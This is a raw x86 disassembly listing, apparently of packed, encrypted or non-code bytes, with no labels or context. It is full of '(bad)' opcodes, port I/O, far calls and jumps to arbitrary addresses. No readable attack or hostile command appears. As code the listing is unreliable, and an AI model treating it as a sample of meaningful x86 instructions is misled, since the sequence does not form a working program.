  419405:	sbb    DWORD PTR [edi-0x28],esp
  419408:	add    BYTE PTR [ecx-0x4a91c16b],ah
  41940e:	lock loopne 0x419432
  419411:	dec    esi
  419412:	es push ss
  419414:	js     0x419450
  419416:	in     eax,dx
  419417:	push   ebx
  419418:	jae    0x419498
  41941a:	stos   BYTE PTR es:[edi],al
  41941b:	mov    esi,0x60d09b3e
  419420:	add    DWORD PTR [edi+0x74],edi
  419423:	xor    al,0x21
  419425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419426:	mov    WORD PTR [ecx+0x50dfa1bb],ss
  41942c:	outs   dx,BYTE PTR ds:[esi]
  41942d:	sub    al,0xdd
  41942f:	test   BYTE PTR [edi-0x52],ah
  419432:	push   ecx
  419433:	loopne 0x419451
  419435:	(bad)  
  419436:	mov    ebx,DWORD PTR [edi]
  419438:	adc    DWORD PTR [edx],0x24
  41943b:	repnz and al,0x5c
  41943e:	and    ecx,DWORD PTR [eax]
  419440:	jle    0x4194c0
  419442:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419443:	push   0x6e1f32e0
  419448:	adc    DWORD PTR [edi],ebp
  41944a:	dec    BYTE PTR [ebp+edx*8-0x9]
  41944e:	in     al,dx
  41944f:	(bad)  
  419450:	xor    esp,ecx
  419452:	dec    ecx
  419453:	inc    edi
  419454:	push   ss
  419455:	cmp    BYTE PTR [eax],dl
  419457:	dec    esi
  419458:	(bad)  [edx-0x14df351b]
  41945e:	mov    ds:0xd8e4b83b,al
  419463:	inc    ecx
  419464:	jns    0x419485
  419466:	inc    esi
  419467:	mov    DWORD PTR [ecx-0x5974848e],0xfd6cd41d
  419471:	add    esi,ebp
  419473:	push   ss
  419474:	pusha  
  419475:	js     0x419449
  419477:	pop    ds
  419478:	fcmovnbe st,st(4)
  41947a:	push   0x57734680
  41947f:	popa   
  419480:	xchg   edx,eax
  419481:	sbb    edx,edx
  419483:	add    DWORD PTR [esi-0x3221b328],ebp
  419489:	xor    eax,0xf3a5f01a
  41948e:	xchg   edi,eax
  41948f:	or     bh,BYTE PTR [eax-0x35cd1226]
  419495:	pop    ecx
  419496:	mov    cl,BYTE PTR [eax+0x4c6c5f16]
  41949c:	xchg   edi,eax
  41949d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41949e:	popf   
  41949f:	dec    ecx
  4194a0:	pop    es
  4194a1:	loope  0x4194a6
  4194a3:	(bad)  
  4194a4:	xor    al,0x8b
  4194a6:	jg     0x419428
  4194a8:	push   ecx
  4194a9:	push   edi
  4194aa:	test   eax,0x4c9edc5c
  4194af:	enter  0x8461,0xd3
  4194b3:	jecxz  0x4194cf
  4194b5:	jns    0x419534
  4194b7:	repz push ebp
  4194b9:	imul   edx,DWORD PTR [ebx+0x2db750f],0xd10a1fa1
  4194c3:	(bad)  
  4194c5:	push   0x34f68cf7
  4194ca:	cwde   
  4194cb:	inc    eax
  4194cc:	ins    BYTE PTR es:[edi],dx
  4194cd:	std    
  4194ce:	add    al,0x9f
  4194d0:	in     eax,dx
  4194d1:	call   0xab6b:0x4291b513
  4194d8:	cmp    ebx,DWORD PTR [edx+0x26]
  4194db:	(bad)  
  4194dc:	fucomp st(0)
  4194de:	(bad)  
  4194df:	push   esp
  4194e0:	jmp    0x4194a1
  4194e2:	mov    al,ds:0xc5ce8c25
  4194e7:	fnstsw WORD PTR [ebp+0x4adeaf88]
  4194ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194ee:	fldenv [edi]
  4194f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194f1:	dec    ebp
  4194f2:	fnsave [esi]
  4194f4:	scas   eax,DWORD PTR es:[edi]
  4194f5:	std    
  4194f6:	mov    ebx,0x677ca673
  4194fb:	pusha  
  4194fc:	es ins BYTE PTR es:[edi],dx
  4194fe:	jecxz  0x4194db
  419500:	movq   QWORD PTR [ecx-0x6c],mm3
  419504:	mov    ebp,0x4dcabe67
  419509:	(bad)  
  41950a:	mov    bl,0xf9
  41950c:	mov    ds:0x78236e7e,al
  419511:	(bad)  
  419512:	stos   BYTE PTR es:[edi],al
  419513:	dec    eax
  419514:	and    ebp,DWORD PTR [edi+0x4fd7759c]
  41951a:	jp     0x4194d6
  41951c:	repz je 0x4194cc
  41951f:	jnp    0x419597
  419521:	stos   BYTE PTR es:[edi],al
  419522:	(bad)  
  419523:	outs   dx,BYTE PTR ds:[esi]
  419524:	out    0x6d,eax
  419526:	sbb    BYTE PTR [esi-0x67],al
  419529:	mov    dl,0x9b
  41952b:	gs push ebx
  41952d:	cmp    dh,BYTE PTR [ecx]
  41952f:	cmp    al,0x2c
  419531:	jmp    0x55ab4e7
  419536:	adc    eax,0xabeef7b9
  41953b:	popa   
  41953c:	dec    edi
  41953d:	lods   al,BYTE PTR ds:[esi]
  41953e:	add    eax,0xe6f43bf9
  419543:	sahf   
  419544:	jge    0x4194e3
  419546:	inc    ebx
  419547:	fldenv [ecx-0x4e]
  41954a:	retf   
  41954b:	inc    ebp
  41954c:	shr    cl,1
  41954e:	std    
  41954f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419550:	fst    DWORD PTR [ebx-0x21]
  419553:	cmovl  esi,DWORD PTR [ecx+0x6712f596]
  41955a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41955b:	fist   DWORD PTR [ecx+ebp*1]
  41955e:	mov    ah,0xb6
  419560:	aad    0x33
  419562:	cmp    eax,0xdcb0a2a6
  419567:	enter  0x65d8,0xe2
  41956b:	push   eax
  41956c:	test   DWORD PTR [esi+ebp*8-0x2c],ebx
  419570:	pop    ds
  419571:	adc    DWORD PTR [ecx],0xcc652b2f
  419577:	stc    
  419578:	call   0xe74d:0x2e4a71c5
  41957f:	mov    ch,0xe
  419581:	sub    bh,BYTE PTR [eax+ecx*8+0x4d7691d5]
  419588:	and    DWORD PTR [ebp+eax*1+0xa],0xffffffc4
  41958d:	inc    eax
  41958e:	cmp    edi,DWORD PTR [ebx+0x38]
  419591:	mov    edx,0x5896123e
  419596:	je     0x4195eb
  419598:	iret   
  419599:	push   ecx
  41959a:	cmp    cl,BYTE PTR cs:[ebx-0x7f61f56e]
  4195a1:	mov    gs,WORD PTR [ebp-0x7b]
  4195a4:	shl    bh,1
  4195a6:	add    ah,BYTE PTR [edi]
  4195a8:	xchg   edx,eax
  4195a9:	sub    al,0x63
  4195ab:	mov    ebp,0xb62d2187
  4195b0:	inc    eax
  4195b1:	fmul   DWORD PTR [ebx-0x50]
  4195b4:	sub    eax,0x5c893e9d
  4195b9:	bswap  esi
  4195bb:	push   esp
  4195bc:	mov    BYTE PTR [eax-0x6428f3a2],dh
  4195c2:	shl    DWORD PTR [ebx-0x996beba],0x28
  4195c9:	ret    
  4195ca:	mov    bh,BYTE PTR [edx]
  4195cc:	inc    ebp
  4195cd:	sbb    DWORD PTR [eax-0x5d],ebx
  4195d0:	jmp    0x482b:0x25c1fc1a
  4195d7:	mov    eax,ds:0x40d6265
  4195dc:	mov    bl,0x4b
  4195de:	sahf   
  4195df:	jb     0x41956d
  4195e1:	dec    ebp
  4195e2:	out    0xa5,al
  4195e4:	or     al,0x85
  4195e6:	bound  eax,QWORD PTR [esi+0x659814e3]
  4195ec:	xor    eax,0x62a6d589
  4195f1:	jb     0x419619
  4195f3:	out    0xb,eax
  4195f5:	xchg   ebp,eax
  4195f6:	pop    ds
  4195f7:	out    0x28,eax
  4195f9:	xchg   ebx,eax
  4195fa:	jo     0x419635
  4195fc:	mov    es,WORD PTR [ebx+0x2695789]
  419602:	sbb    esi,eax
  419604:	(bad)  
  419605:	enter  0x3e26,0x76
  419609:	jecxz  0x4195c8
  41960b:	jl     0x41961b
  41960d:	sbb    ecx,DWORD PTR [ebx+0x41]
  419610:	in     eax,dx
  419611:	outs   dx,DWORD PTR ds:[esi]
  419612:	fisttp DWORD PTR [ecx-0x2760b887]
  419618:	push   ss
  419619:	mov    DWORD PTR [esi+0x4237b836],ebx
  41961f:	xchg   DWORD PTR [ebx+0x730039cb],eax
  419625:	mov    BYTE PTR [ebp-0x5f],0xfa
  419629:	mov    ch,0x36
  41962b:	in     al,0xa4
  41962d:	jae    0x4195b2
  41962f:	and    bl,dl
  419631:	fsubp  st(0),st
  419633:	bound  ebp,QWORD PTR [ebx]
  419635:	repz cmp eax,0xda20ab3b
  41963b:	mov    eax,0x848da527
  419640:	xor    al,BYTE PTR [ebx+0x3cc8094f]
  419646:	and    BYTE PTR [ebx+0x21],0xef
  41964a:	je     0x41965e
  41964c:	jmp    0x419621
  41964e:	(bad)  
  41964f:	xchg   edi,eax
  419650:	adc    DWORD PTR [edx],ebx
  419652:	dec    esp
  419653:	retf   0xf2fb
  419656:	jge    0x4196d4
  419658:	lock retf 0x6889
  41965c:	sub    eax,0xdad64ac5
  419661:	mov    bl,0x9b
  419663:	loopne 0x4196c8
  419665:	sbb    cl,BYTE PTR [edx+0x5b3ceed3]
  41966b:	xor    DWORD PTR [eax+0x71],ebx
  41966e:	in     al,0x7c
  419670:	jo     0x419665
  419672:	xchg   esi,eax
  419673:	xor    DWORD PTR ds:0x7cd37369,esp
  419679:	and    BYTE PTR [ebp-0x6d],ch
  41967c:	pop    edx
  41967d:	xor    edi,esi
  41967f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419680:	frstor [ecx-0x71]
  419683:	mov    esi,edi
  419685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419686:	fisub  WORD PTR [edi+ebp*1+0x57074092]
  41968d:	dec    ebx
  41968e:	out    dx,eax
  41968f:	(bad)  
  419691:	and    BYTE PTR [ebp+ecx*2+0x6be8597a],ah
  419698:	mov    ss,WORD PTR [ecx-0x24623bd9]
  41969e:	xchg   esi,edx
  4196a0:	jnp    0x419670
  4196a2:	mov    al,ds:0x9ffe395
  4196a7:	and    BYTE PTR [edi],0x4c
  4196aa:	dec    eax
  4196ab:	mov    gs,WORD PTR [ebx]
  4196ad:	sub    eax,0x3a0d4f12
  4196b2:	mov    es,WORD PTR [eax]
  4196b4:	and    DWORD PTR [eax+0x5a51ecb2],ebx
  4196ba:	fmul   DWORD PTR [esi+0x27]
  4196bd:	inc    ebx
  4196be:	out    dx,al
  4196bf:	aam    0x55
  4196c1:	mov    edx,0xe142d86e
  4196c6:	sub    al,0x85
  4196c8:	sbb    ah,bl
  4196ca:	test   eax,0xcb8332e6
  4196cf:	xlat   BYTE PTR ds:[ebx]
  4196d0:	stos   DWORD PTR es:[edi],eax
  4196d1:	lds    edi,FWORD PTR [esi+0x7d]
  4196d4:	js     0x41965a
  4196d6:	(bad)  
  4196d7:	scas   eax,DWORD PTR es:[edi]
  4196d8:	mov    al,0xcc
  4196da:	aaa    
  4196db:	in     al,0x93
  4196dd:	push   ss
  4196de:	jmp    0x2225f083
  4196e3:	cmp    al,0x8a
  4196e5:	sti    
  4196e6:	push   edx
  4196e7:	pop    edx
  4196e8:	or     DWORD PTR [esi+edi*1],0xffffffcb
  4196ec:	xor    cl,BYTE PTR [ecx+0x5]
  4196ef:	jns    0x419730
  4196f1:	fst    DWORD PTR [esi-0x71917074]
  4196f7:	xchg   DWORD PTR [eax-0x6c885d4a],eax
  4196fd:	imul   ebx,ecx,0x5a
  419700:	lock or ecx,edi
  419703:	shl    BYTE PTR [eax+0x216dd99f],cl
  419709:	mov    ebp,0x3d65d31d
  41970e:	jno    0x41975f
  419710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419711:	pop    edx
  419712:	sbb    dh,0x9a
  419715:	push   0x4e
  419717:	sar    BYTE PTR [eax-0x225c7380],0x4
  41971e:	retf   
  41971f:	int    0x20
  419721:	aad    0xcc
  419723:	jle    0x4196d9
  419725:	push   ss
  419726:	add    BYTE PTR [edi-0x7e],cl
  419729:	ss ret 
  41972b:	or     eax,0xa50635f2
  419730:	jg     0x41970d
  419732:	ds push esi
  419734:	es add eax,0x2d959d8e
  41973a:	dec    esi
  41973b:	xor    DWORD PTR ds:0x17eb7a2f,eax
  419741:	dec    esi
  419742:	and    dl,BYTE PTR [ebx+0x29]
  419745:	inc    ebp
  419746:	call   0xbb2cb0eb
  41974b:	cmp    ah,0xb
  41974e:	pop    ss
  41974f:	push   eax
  419750:	into   
  419751:	iret   
  419752:	std    
  419753:	jo     0x419789
  419755:	and    bl,ch
  419757:	adc    DWORD PTR [ecx-0x7],ebx
  41975a:	push   ecx
  41975b:	or     eax,0xe9a98a77
  419760:	int3   
  419761:	xor    ecx,esi
  419763:	inc    edi
  419764:	adc    DWORD PTR [edi],esi
  419766:	dec    edx
  419767:	(bad)  
  419768:	out    0x13,al
  41976a:	push   eax
  41976b:	mov    WORD PTR [ebx-0x109edc2b],gs
  419771:	mov    WORD PTR [ebx],ss
  419773:	mov    dh,0xff
  419775:	popf   
  419776:	outs   dx,DWORD PTR ds:[esi]
  419777:	cmp    al,BYTE PTR [eax+0x2]
  41977a:	outs   dx,BYTE PTR ds:[esi]
  41977b:	or     edi,DWORD PTR [eax-0x14]
  41977e:	je     0x419778
  419780:	loope  0x4197a2
  419782:	inc    ebx
  419783:	loopne 0x4197e3
  419785:	push   edi
  419786:	out    dx,al
  419787:	std    
  419788:	pushf  
  419789:	lahf   
  41978a:	outs   dx,DWORD PTR ds:[esi]
  41978b:	adc    BYTE PTR [edi-0x11],ch
  41978e:	sbb    al,0xe4
  419790:	leave  
  419791:	data16 aaa 
  419793:	addr16 mov al,0x62
  419796:	ja     0x41976c
  419798:	jmp    0x4197c2
  41979a:	xor    BYTE PTR [ebx+0x2d],bl
  41979d:	shl    BYTE PTR [ecx-0x44],0x4c
  4197a1:	mov    ebx,0x3d2d034c
  4197a6:	lock call 0x661e8743
  4197ac:	add    al,BYTE PTR [eax-0x74]
  4197af:	inc    edi
  4197b0:	out    0xae,al
  4197b2:	add    ch,BYTE PTR [edx+ebp*4]
  4197b5:	pusha  
  4197b6:	or     ebx,DWORD PTR [edi]
  4197b8:	xchg   DWORD PTR [eax+0x41],ebx
  4197bb:	mov    ds:0x582d2681,al
  4197c0:	and    DWORD PTR [ebx+0x2b],esp
  4197c3:	test   DWORD PTR [edx],edi
  4197c5:	add    eax,0xa7e5c987
  4197ca:	xchg   edi,eax
  4197cb:	into   
  4197cc:	sub    ecx,ebp
  4197ce:	or     ecx,ecx
  4197d0:	(bad)  
  4197d1:	mov    ah,0xd
  4197d3:	pop    ebp
  4197d4:	or     BYTE PTR [edi-0x10],bh
  4197d7:	push   ds
  4197d8:	mov    esi,0x7f427d5b
  4197dd:	and    BYTE PTR [ebp-0x1e4701dc],dh
  4197e3:	sbb    al,0x46
  4197e5:	xchg   edi,eax
  4197e6:	pop    eax
  4197e7:	xchg   ebx,eax
  4197e8:	mov    ch,0xe1
  4197ea:	loope  0x4197c7
  4197ec:	or     DWORD PTR [edi+0x372fefc2],ebp
  4197f2:	fsub   QWORD PTR [ebx]
  4197f4:	inc    esi
  4197f5:	int    0x7f
  4197f7:	gs jmp 0x4197a3
  4197fa:	hlt    
  4197fb:	mov    WORD PTR [ecx-0x44],cs
  4197fe:	sub    al,0xf2
  419800:	sbb    al,0xa2
  419802:	xchg   ecx,eax
  419803:	ficomp DWORD PTR [ecx+ebp*1+0x7de3725f]
  41980a:	xchg   esp,eax
  41980b:	pop    ecx
  41980c:	mov    al,0x95
  41980e:	xor    eax,DWORD PTR [edx+ecx*8+0x55]
  419812:	and    dl,dl
  419814:	jmp    0x715c3e96
  419819:	xor    al,0x39
  41981b:	popa   
  41981c:	fild   QWORD PTR [ebx]
  41981e:	das    
  41981f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419820:	jae    0x4197f5
  419822:	icebp  
  419823:	scas   al,BYTE PTR es:[edi]
  419824:	dec    eax
  419825:	mov    eax,ds:0xf2a0ed88
  41982a:	sbb    al,BYTE PTR fs:[eax+0x304dd99c]
  419831:	mov    ch,0xcb
  419833:	hlt    
  419834:	pop    edi
  419835:	in     eax,0x6d
  419837:	cmp    bh,al
  419839:	push   cs
  41983a:	test   cl,ch
  41983c:	xchg   edx,eax
  41983d:	retf   
  41983e:	jmp    FWORD PTR [ecx+ebp*8]
  419841:	(bad)  
  419842:	bound  ebx,QWORD PTR [eax-0x50]
  419845:	mov    ebp,0x9b59dc3b
  41984a:	lock es je 0x419861
  41984e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41984f:	ret    
  419850:	or     al,0x8b
  419852:	sbb    ebx,esp
  419854:	add    dl,dh
  419856:	shr    DWORD PTR [edi],1
  419858:	mov    ebp,0x53c843b2
  41985d:	mov    al,ds:0x37e55baf
  419862:	mov    eax,ds:0xe7b38918
  419867:	popf   
  419868:	mov    edi,0x589a000a
  41986d:	ret    0xef68
  419870:	lods   eax,DWORD PTR ds:[esi]
  419871:	mov    edi,0x90eb6001
  419876:	rcr    BYTE PTR [ebp-0x5d],cl
  419879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41987a:	ja     0x4198a6
  41987c:	jecxz  0x4198d3
  41987e:	mov    ah,0x87
  419880:	rcl    DWORD PTR [ebx-0x68],1
  419883:	add    ecx,esp
  419885:	(bad)  
  419886:	sub    edi,DWORD PTR ds:0x588a3ae5
  41988c:	and    ch,al
  41988e:	adc    DWORD PTR [esi+0x2fa031db],eax
  419894:	xchg   ax,ax
  419896:	pop    edx
  419897:	hlt    
  419898:	jo     0x41986f
  41989a:	cld    
  41989b:	stos   BYTE PTR es:[edi],al
  41989c:	sar    BYTE PTR [edx],cl
  41989e:	ss mov esp,0x2992e949
  4198a4:	cmp    BYTE PTR [edx+0x510579a5],ch
  4198aa:	rcl    DWORD PTR [edi-0x1f],cl
  4198ad:	mov    WORD PTR [edx],dx
  4198b0:	sbb    BYTE PTR [ebx+0x76],ah
  4198b3:	inc    eax
  4198b4:	loopne 0x41983b
  4198b6:	xchg   edx,eax
  4198b7:	scas   eax,DWORD PTR es:[edi]
  4198b8:	nop
  4198b9:	verw   bx
  4198bc:	cmp    al,0x8d
  4198be:	ins    BYTE PTR es:[edi],dx
  4198bf:	inc    esp
  4198c0:	ror    dl,cl
  4198c2:	and    esi,esi
  4198c4:	adc    BYTE PTR [edi],al
  4198c6:	mov    ebx,0x9a16c179
  4198cb:	xchg   ebx,eax
  4198cc:	loopne 0x4198f9
  4198ce:	xchg   ebx,eax
  4198cf:	pop    esp
  4198d0:	mov    esi,0xe4539a8e
  4198d5:	fs out dx,al
  4198d7:	shl    BYTE PTR [esi+0x43],cl
  4198da:	jg     0x419940
  4198dc:	test   bh,dh
  4198de:	push   0x351ab0b7
  4198e3:	(bad)  [eax]
  4198e5:	push   cs
  4198e6:	iret   
  4198e7:	push   esp
  4198e8:	enter  0xd96a,0x57
  4198ec:	xchg   ebx,eax
  4198ed:	fucomp st(7)
  4198ef:	mov    edx,0x1b93ceab
  4198f4:	shr    al,cl
  4198f6:	loopne 0x4198c8
  4198f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198f9:	outs   dx,BYTE PTR ds:[esi]
  4198fa:	jbe    0x419915
  4198fc:	mov    al,ds:0x4b35445a
  419901:	push   ecx
  419902:	pop    ebx
  419903:	sbb    cl,al
  419905:	pop    DWORD PTR [edx]
  419907:	adc    al,0xc8
  419909:	outs   dx,DWORD PTR ds:[si]
  41990b:	and    BYTE PTR [edx-0x5cfdf581],cl
  419911:	cwde   
  419912:	and    eax,ebx
  419914:	dec    esi
  419915:	xor    ebx,DWORD PTR [edi-0x21]
  419918:	pop    esi
  419919:	popa   
  41991a:	mov    ecx,0xc91c27ca
  41991f:	ja     0x4198a3
  419921:	jne    0x4198bc
  419923:	cmp    DWORD PTR [ecx],esp
  419925:	fwait
  419926:	adc    BYTE PTR [esi-0x2e691214],dh
  41992c:	jns    0x419933
  41992e:	add    cl,BYTE PTR [ecx]
  419930:	in     al,dx
  419931:	dec    esi
  419932:	aaa    
  419933:	add    DWORD PTR [ecx+0x25],edi
  419936:	hlt    
  419937:	sbb    eax,0xc8a2fdd6
  41993c:	push   edi
  41993d:	mov    DWORD PTR [esi+0x67a853c7],edi
  419943:	xchg   BYTE PTR [edi+ebx*1+0x4b8f875c],al
  41994a:	adc    BYTE PTR [ecx-0x2d00dca6],bl
  419950:	ja     0x419926
  419952:	iret   
  419953:	ds pusha 
  419955:	rcl    cl,cl
  419957:	inc    ebx
  419958:	ja     0x41993f
  41995a:	frstor [ebp+0x78]
  41995d:	xchg   BYTE PTR [eax],bl
  41995f:	shl    BYTE PTR [edx+0x12d25562],cl
  419965:	ret    
  419966:	xor    ah,ah
  419968:	(bad)  
  419969:	jmp    0x2075:0x81bc1955
  419970:	inc    DWORD PTR [ebp-0x3d]
  419973:	mov    esp,0xbdf8f5f6
  419978:	push   edx
  419979:	popf   
  41997a:	mov    esp,0xee2c5026
  41997f:	pop    esp
  419980:	inc    esp
  419981:	cmp    edi,eax
  419983:	dec    esi
  419984:	xlat   BYTE PTR ds:[ebx]
  419985:	out    dx,al
  419986:	fdivr  st,st(2)
  419988:	add    dh,BYTE PTR [ebp+0x4b167001]
  41998e:	add    eax,DWORD PTR [eax]
  419990:	adc    al,0xe9
  419992:	mov    dh,0x77
  419994:	add    bl,BYTE PTR [ebx]
  419996:	in     eax,0x52
  419998:	jne    0x419972
  41999a:	adc    ch,al
  41999c:	xchg   ebx,eax
  41999d:	sub    eax,0xea39e9df
  4199a2:	sub    edi,ebp
  4199a4:	jle    0x419963
  4199a6:	jle    0x4199b3
  4199a8:	lahf   
  4199a9:	test   eax,0x5f6efecb
  4199ae:	mov    ds:0x41531726,al
  4199b3:	call   0x5d972b25
  4199b8:	popa   
  4199b9:	xchg   esp,eax
  4199ba:	rcl    ah,cl
  4199bc:	mov    DWORD PTR [eax+edx*1-0x7eb18bc2],0xbd2f9681
  4199c7:	xchg   edx,eax
  4199c8:	add    al,0xb1
  4199ca:	xchg   ecx,eax
  4199cb:	in     al,dx
  4199cc:	add    al,0x94
  4199ce:	xor    al,0xb5
  4199d0:	out    0x67,al
  4199d2:	loope  0x419960
  4199d4:	dec    edx
  4199d5:	stc    
  4199d6:	cmp    eax,0x64d1ba29
  4199db:	bnd jmp 0xa8a4c74d
  4199e1:	in     al,0x4a
  4199e3:	adc    DWORD PTR [esp+ecx*4],ebp
  4199e6:	inc    edx
  4199e7:	cmp    al,0x46
  4199e9:	and    al,bl
  4199eb:	bound  esp,QWORD PTR [ebx-0x71084775]
  4199f1:	ins    BYTE PTR es:[edi],dx
  4199f2:	shr    DWORD PTR [edi+ecx*4],cl
  4199f5:	push   ds
  4199f6:	call   0x1f0d:0x917d72a5
  4199fd:	inc    edi
  4199fe:	cld    
  4199ff:	or     DWORD PTR [esi],ebp
  419a01:	dec    ebx
  419a02:	call   FWORD PTR [ecx-0x55c2bf35]
  419a08:	call   FWORD PTR [edi]
  419a0a:	push   0xffffffd9
  419a0c:	in     eax,0xed
  419a0e:	sub    DWORD PTR [ecx-0x7c],0xf4e8c8cd
  419a15:	jle    0x3a790e32
  419a1b:	icebp  
  419a1c:	and    esi,esp
  419a1e:	sub    al,0x79
  419a20:	in     eax,dx
  419a21:	pop    ebx
  419a22:	mov    dh,0x32
  419a24:	lahf   
  419a25:	push   0x6f
  419a27:	jbe    0x419a3b
  419a29:	test   ah,dl
  419a2b:	mov    bh,BYTE PTR [ecx-0x63]
  419a2e:	or     DWORD PTR [ebx+0x69],edi
  419a31:	(bad)  
  419a32:	out    dx,al
  419a33:	xor    eax,edi
  419a35:	dec    ebx
  419a36:	loopne 0x4199db
  419a38:	cdq    
  419a39:	(bad)  
  419a3a:	gs mov ebp,0xaa826aeb
  419a40:	cmp    DWORD PTR [eax+0x60e6a0c6],esp
  419a46:	dec    edi
  419a47:	cs mov edi,0x419df795
  419a4d:	fs adc eax,0xf449871e
  419a53:	cmp    DWORD PTR [ebx+0x7261b36f],ebx
  419a59:	fisttp QWORD PTR [edi+0x5]
  419a5c:	jno    0x4199f7
  419a5e:	shr    DWORD PTR [edx],cl
  419a60:	sbb    cl,BYTE PTR ds:0xe47ec1b2
  419a66:	or     al,0x2e
  419a68:	rcr    DWORD PTR [eax],cl
  419a6a:	cmp    DWORD PTR [edx-0x6b74edee],edx
  419a70:	dec    esp
  419a71:	repnz int3 
  419a73:	jns    0x419a6b
  419a75:	loope  0x419a26
  419a77:	pop    ds
  419a78:	ror    BYTE PTR ds:0xb9a94050,cl
  419a7e:	in     eax,dx
  419a7f:	(bad)
  419a82:	and    al,0x4c
  419a84:	mov    edi,edi
  419a86:	and    eax,0x1bdc6cec
  419a8b:	arpl   WORD PTR [ebp-0x2d],si
  419a8e:	and    bl,BYTE PTR [edi]
  419a90:	xchg   DWORD PTR [ebp+0x54],ebp
  419a93:	bnd jmp 0x419aae
  419a96:	fnstsw WORD PTR ds:0xfcfc2f7d
  419a9c:	mov    dl,dh
  419a9e:	pop    edx
  419a9f:	inc    bx
  419aa1:	lock sbb DWORD PTR [eax],esp
  419aa4:	leave  
  419aa5:	or     eax,ecx
  419aa7:	push   es
  419aa8:	cmp    bh,BYTE PTR [edx+0x7d]
  419aab:	mov    eax,0xac3492e6
  419ab0:	jo     0x419a5d
  419ab2:	mov    bh,0xbb
  419ab4:	bound  esi,QWORD PTR [esi-0x15]
  419ab7:	mov    ds:0xef272a5d,eax
  419abc:	test   eax,0xb9ab9c17
  419ac1:	(bad)  [esi+0x1f]
  419ac4:	dec    edi
  419ac5:	sub    eax,0xc7884118
  419aca:	add    eax,0xa2f2a959
  419acf:	jg     0x419ab2
  419ad1:	xor    ah,ch
  419ad3:	ret    0xa781
  419ad6:	ret    0xcf48
  419ad9:	xchg   ebx,eax
  419ada:	hlt    
  419adb:	sti    
  419adc:	xchg   esp,eax
  419add:	pop    edx
  419ade:	adc    ecx,DWORD PTR [edi]
  419ae0:	scas   al,BYTE PTR es:[edi]
  419ae1:	adc    bh,BYTE PTR [eax+0x18]
  419ae4:	xor    DWORD PTR [ecx-0x20d10d48],ecx
  419aea:	addr16 mov esi,0xfdfa0b2
  419af0:	test   eax,0x13ee5820
  419af5:	jl     0x419b48
  419af7:	bts    DWORD PTR [ebp+ebp*4-0x6042b526],esp
  419aff:	mov    DWORD PTR [esp+edx*4-0x53],0xb0227384
  419b07:	js     0x419aa7
  419b09:	jne    0x419ac2
  419b0b:	loope  0x419b5b
  419b0d:	shl    DWORD PTR [ebx+edx*4],0xf9
  419b11:	dec    esp
  419b12:	mov    al,ds:0x89045670
  419b17:	add    BYTE PTR [ebp-0x68a92e38],cl
  419b1d:	mov    fs,WORD PTR [ecx+0x103096e]
  419b23:	cmp    eax,esp
  419b25:	add    ecx,esp
  419b27:	xor    al,0xa3
  419b29:	aas    
  419b2a:	aad    0x25
  419b2c:	lock push ss
  419b2e:	int3   
  419b2f:	jge    0x419b9b
  419b31:	retf   0x330
  419b34:	js     0x419b40
  419b36:	adc    DWORD PTR [esi+0x6f],edx
  419b39:	pop    ecx
  419b3a:	test   BYTE PTR [ebx-0x39],0x3f
  419b3e:	add    esi,DWORD PTR [ecx+0x6d2fcd69]
  419b44:	in     eax,0xd9
  419b46:	xlat   BYTE PTR ds:[ebx]
  419b47:	loopne 0x419b6b
  419b49:	inc    esp
  419b4a:	xchg   esi,eax
  419b4b:	aaa    
  419b4c:	jo     0x419ae7
  419b4e:	out    0x74,eax
  419b50:	sbb    cl,BYTE PTR [ecx+ecx*2]
  419b53:	adc    al,0x4a
  419b55:	repz and cl,0xe2
  419b59:	mov    DWORD PTR [esi-0x4c],ebx
  419b5c:	cli    
  419b5d:	xchg   BYTE PTR [edi],dh
  419b5f:	(bad)  
  419b60:	ins    DWORD PTR es:[edi],dx
  419b61:	add    al,0x81
  419b63:	sub    ah,BYTE PTR [edi-0x1]
  419b66:	mov    DWORD PTR [ebx],esi
  419b68:	mov    ds:0x2ac3b18d,eax
  419b6d:	fist   DWORD PTR [esi*4+0x48b6d974]
  419b74:	add    ecx,eax
  419b76:	and    esi,DWORD PTR [eax]
  419b78:	fdiv   QWORD PTR [esi]
  419b7a:	loop   0x419bce
  419b7c:	add    BYTE PTR [edx+0x76eb871a],0xd9
  419b83:	cmp    DWORD PTR ds:[eax-0x80],0x4de52771
  419b8b:	ja     0x419b39
  419b8d:	js     0x419b4a
  419b8f:	xor    al,0xf0
  419b91:	sar    BYTE PTR [ecx+0x2c],0x3f
  419b95:	add    BYTE PTR [edi-0x48],0xba
  419b99:	sbb    BYTE PTR [esp+edx*8-0x4d],dl
  419b9d:	leave  
  419b9e:	add    eax,0xd7062093
  419ba3:	fwait
  419ba4:	mov    edi,0x7f11d640
  419ba9:	or     BYTE PTR [eax+eax*8],bh
  419bac:	inc    esp
  419bad:	pop    ecx
  419bae:	(bad)  
  419baf:	cs pushf 
  419bb1:	sub    ebp,DWORD PTR [esi]
  419bb3:	clc    
  419bb4:	in     al,dx
  419bb5:	xchg   ebp,eax
  419bb6:	dec    ebp
  419bb7:	aaa    
  419bb8:	xchg   DWORD PTR [ebp-0x6bc1da6b],ecx
  419bbe:	pop    edx
  419bbf:	pop    esi
  419bc0:	adc    ch,BYTE PTR [eax]
  419bc2:	cmp    edi,DWORD PTR [ebx-0x21]
  419bc5:	or     BYTE PTR [edi+ebx*8],ch
  419bc8:	das    
  419bc9:	jnp    0x419b9f
  419bcb:	les    esi,FWORD PTR [ebx]
  419bcd:	cdq    
  419bce:	and    DWORD PTR [ebx-0x11],ebx
  419bd1:	mov    ah,0xed
  419bd3:	aam    0x35
  419bd5:	iret   
  419bd6:	add    DWORD PTR [edx],esi
  419bd8:	test   DWORD PTR [ebx+0x75ad2673],0x46f9f31d
  419be2:	popa   
